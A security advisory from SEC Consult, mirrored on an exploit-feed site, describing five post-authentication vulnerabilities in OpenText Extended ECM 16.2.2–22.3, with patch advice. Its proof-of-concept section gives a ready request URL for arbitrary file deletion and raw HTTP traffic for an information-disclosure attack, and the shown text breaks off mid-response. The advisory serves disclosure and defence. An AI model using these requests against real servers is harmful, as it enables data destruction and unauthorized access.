---
title: OpenText Extended ECM 22.3 File Deletion / LFI / Privilege Escsalation Vulnerabilities exploit
url: https://sploitus.com/exploit?id=1337DAY-ID-38166&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-01-23
fetch_date: 2025-10-04T04:35:13.336090
---

# OpenText Extended ECM 22.3 File Deletion / LFI / Privilege Escsalation Vulnerabilities exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for OpenText Extended ECM 22.3 File Deletion / LFI / Privilege Escsalation Vulnerabilities CVE-2022-45922 CVE-2022-45924 CVE-2022-45925 CVE-2022-45926 CVE-2022-45928

2023-01-22 | CVSS 8.8

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=1337DAY-ID-38166
=======================================================================
               title: Multiple post-authentication vulnerabilities including RCE
             product: OpenText™ Content Server component of OpenText™ Extended ECM
  vulnerable version: 16.2.2 - 22.3
       fixed version: 22.4
          CVE number: CVE-2022-45924, CVE-2022-45922, CVE-2022-45925,
                      CVE-2022-45926, CVE-2022-45928
              impact: High
            homepage: https://www.opentext.com/
               found: 2022-09-16
                  by: Armin Stock (Atos)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"OpenText™ Extended ECM is an enterprise CMS platform that securely governs the
information lifecycle by integrating with leading enterprise applications, such
as SAP®, Microsoft® 365, Salesforce and SAP SuccessFactors®. Bringing content
and processes together, Extended ECM provides access to information when and
where it’s needed, improves decision-making and drives operational effectiveness."

Source: https://www.opentext.com/products/extended-ecm

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

Vulnerability overview/description:
-----------------------------------
1) Deletion of arbitrary files (CVE-2022-45924)
The endpoint `itemtemplate.createtemplate2` allows a low privilege user to
delete arbitrary files on the server's local filesystem.

2) Privilege escalation due to logic error in cookie creation  (CVE-2022-45922)
The request handler for a user accessible function sets a valid AdminPwd cookie
that allows access to unauthorized endpoints without knowing the password.

3) xmlExport multiple vulnerabilities (CVE-2022-45925)
3.1) Information disclosure
The action `xmlexport` accepts the parameter `requestContext`. If this
parameter is present, the response does include most of the `HTTP` headers sent
to the server and some of the `CGI` variables like `remote_addr` and
`server_name`.

3.2) Capture of NTLM hashes
The action `xmlexport` accepts the parameter `transform` in combination
with `stylesheet`. The `stylesheet` parameter can be a `nodeID` or a filepath.
If a filepath is specified, the `ContentServer` tries to open the file. As
absolute paths are allowed it is possible to provide a network share to force
the `ContentServer` to open a connection to the network share. This allows an
attacker to capture the `NTLM Hash` of the user running the `ContentServer`.

4) Evaluate webreports via notify.localizeEmailTemplate (CVE-2022-45926)
The endpoint `notify.localizeEmailTemplate` does allow a low privilege user to
evaluate webreports. This can be used to perform a `Server Side Request Forgery
(SSRF)` attack, with nearly full control of the actual request.

5) Local File Inclusion allows Oscript execution (CVE-2022-45928)
Multiple endpoints allow the user to pass the parameter `htmlFile`, which is
included in the `HTML` output rendering pipeline of the request. As the
`Content Server` evaluates and executes `Oscript` code in `HTML` files, it is
possible for an attacker to execute `Oscript` code. The `Oscript` scripting
language allows the attacker for example to manipulate files on the filesystem,
create new network connections or execute OS system commands.

Proof of concept:
-----------------
1) Deletion of arbitrary files (CVE-2022-45924)
As a first step the user has to create a new `Customer View Template` object via
`/cs.exe?func=ll&objAction=create&objtype=844&nextURL=foo` to get a valid
`cacheID`. With the acquired `cacheID` the following request can be used to
delete a file. The parameter `DefinitionFile` controls which file should be
deleted.

-------------------------------------------------------------------------------
http://opentext-dev/OTCS/cs.exe?func=itemtemplate.createtemplate2&objType=844&parentId=2000&cacheID=730440157&DefinitionFile=C:/temp/poc-del.txt
-------------------------------------------------------------------------------

2) Privilege escalation due to logic error in cookie creation (CVE-2022-45922)
Sending the following request returns a new valid `AdminPwd` cookie.

-------------------------------------------------------------------------------
[ PoC removed, will be published at a later date ]
-------------------------------------------------------------------------------

Response:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
Server: Microsoft-IIS/10.0
Set-Cookie:
LLCookie=7X%2BfmttVXssmR2fGiuA4%2BeDFI4%2FotYL4o%2BkpxBTZUWrlHqwvH%2BIg3BCPhuBhD%2B567K288n7PJNeZQkk75EmxtndEpU3chq3cFppnAQ7OAYMX%2Bvl09QntFKi9E%2BWekSdNU866093uXCT4IqYR1ofVfkoLKFwTiUf%2BhgrVKaB8aoLOLlBU5RIrNA%3D%3D;
path=/OTCS/; httponly
Set-Cookie:
AdminPwd=oq6SNA9Db6yUl0vP1ucJkLuRhIYbvO3YdIujUbLLdzGMsygouzJlyuhDLTriq4C1XrMHxWYWkCeuxoZevX0%2BYyFMEevzZVXI6Fe82YBI3HnKu2Stq50vZ8bhPPQeBbXiW%2FRwgp8RHukHgnEWUq3axpUP5OHWCJj9V3Pj5%2FNNqJKie0gUv055KavSIj80Id4dXDiHVu%2FI6IXMhEb1Tm4EVLE1rjxMnpmZILTKds%2FkabH%2FanPx5Jl3YL%2BBkX0PiPe54guaWQj2ReTr1SW7Beomoriq2FrW%2BWK91OtMy%2BbrVTfgEZSRdRNIkA%3D%3D;
path=/OTCS/; httponly
X-Powered-By: ASP.NET
Date: Sat, 01 Oct 2022 17:57:54 GMT
Connection: close
Content-Length: 221

{"errMsg":"","ok":true,"sessionInactivity":1620000,"sessionLogoutURL":"?func=ll.DoLogout&secureRequestToken=STWVlmadtchZfgpCevUaWz%2FG%2BaDWVMAmJIByhcw6J3FRBkfQdUEyakxuWBKKZIfkujPUOp2jURQ%3D","sessionReactionTime":180000}
-------------------------------------------------------------------------------

3) xmlExport multiple vulnerabilities (CVE-2022-45925)
3.1) Information disclosure
Sending the following request reveals sensitive information about the
request:

-------------------------------------------------------------------------------
GET /OTCS//cs.exe?func=ll&objAction=xmlexport&requestContext=T&objId=2004 HTTP/1.1
Host: opentext-dev
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: LLCookie=Ztn...
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------

Response:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
Content-Type: application/xml
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 01 Oct 2022 16:13:40 GMT
Connection: close
Content-Length: 12581

<?xml version="1.0" encoding="UTF-8"?>
<livelink Acls='false' appversion='16.2.0' AttributeInfo='false' CallbackHandlerName='{''}' ContentInline='false' DoingImport='false' ExtUserInfo='false' FollowAliases='false' ForImport='false'
HandlerName='XmlExport' NodeInfo='false' Permissions='false' Schema='false' Scope='one' src='XmlExport'>
   <context>
     <user deleted='0' groupid='999' groupname='[Content Server Administration]' groupownerid='1000' grouptype='11' id='1000' name='Admin' ownerid='1000' spaceid='0' type='0' userprivileges='16777215'/>
     <cgi auth_type='' content_length='0' content_type='' path_info='' query_string='func=ll&objAction=xmlexport&requestContext=T&objId=2004' remote_addr='$IP' remote_host='$IP' remo...